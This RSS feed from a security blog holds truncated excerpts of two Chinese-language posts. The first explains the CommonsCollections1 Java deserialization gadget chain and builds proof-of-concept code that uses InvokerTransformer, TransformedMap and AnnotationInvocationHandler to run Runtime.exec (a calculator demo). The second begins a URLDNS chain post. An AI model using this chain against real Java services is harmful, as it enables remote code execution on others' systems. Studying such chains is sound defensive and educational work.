<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
  <channel>
    <title>Java - Category - N1Rvana&#39;s Blog</title>
    <link>https://nlrvana.github.io/categories/java/</link>
    <description>Java - Category | N1Rvana&#39;s Blog</description>
    <generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Sun, 14 Jan 2024 23:37:48 &#43;0800</lastBuildDate><atom:link href="https://nlrvana.github.io/categories/java/" rel="self" type="application/rss+xml" /><item>
  <title>CommonsCollections1链详解</title>
  <link>https://nlrvana.github.io/commonscollections1%E9%93%BE%E8%AF%A6%E8%A7%A3/</link>
  <pubDate>Sun, 14 Jan 2024 23:37:48 &#43;0800</pubDate>
  <author>Author</author>
  <guid>https://nlrvana.github.io/commonscollections1%E9%93%BE%E8%AF%A6%E8%A7%A3/</guid>
  <description><![CDATA[CommonsCollections1链详解jdk8源码下载 https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4 漏洞触发点在org.apache.commons.collections.functors.InvokerTransformer 其中的transform()方法
很明显的一个反射调用，其中iMethodName、iParamTypes、iArgs都是可控的变量，便可以调用任意方法和任意参数 看一下构造器是如何赋值的
构造一个简单的 payload 试试 new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;}).transform(Runtime.getRuntime()); ``
找一个任意类调用transforms()方法的方法，这里选择org.apache.commons.collections.map.TransformedMap类的checkSetValue()方法
valueTransformer变量可控
但是因为构造器是protected修饰，所以无法直接调用，利用这里的静态方法decorate()进行了调用
再查看一下哪里调用了checkSetValue()方法，只有这一处
setValue()方法调用了checkSetValue()，构造一个payload，看看能不能通
1 2 3 4 5 6 7 8 Runtime r = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(&#34;exec&#34;,new Class[]{String.class},new Object[]{&#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#34;}); HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;(); map.put(&#34;key&#34;,&#34;value&#34;); Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,invokerTransformer); for(Map.Entry entry:transformedMap.entrySet()){ entry.setValue(r); 接着找一个setValue()方法的调用，在sun.reflect.annotation.AnnotationInvocationHandler类中，找到了如下方法
这里调用了setValue()方法，并且还在readObject()方法中，继续构造poc
1 2 3 4 5 6 7 8 9 10 Runtime r = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(&#34;exec&#34;,new Class[]{String.]]></description>
</item>
<item>
  <title>URLDNS链详解</title>
  <link>https://nlrvana.github.io/urldns%E9%93%BE%E8%AF%A6%E8%A7%A3/</link>
  <pubDate>Sun, 14 Jan 2024 00:12:12 &#43;0800</pubDate>
  <author>Author</author>
  <guid>https://nlrvana.github.io/urldns%E9%93%BE%E8%AF%A6%E8%A7%A3/</guid>
  <description><![CDATA[&lt; !&ndash;more&ndash;&gt;
先来看一下如何序列化/反序列化
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 package org.example; import java.io.*; public class App { public static void main( String[] args ) throws Exception { user user = new user(); user.]]></description>
</item>
</channel>
</rss>
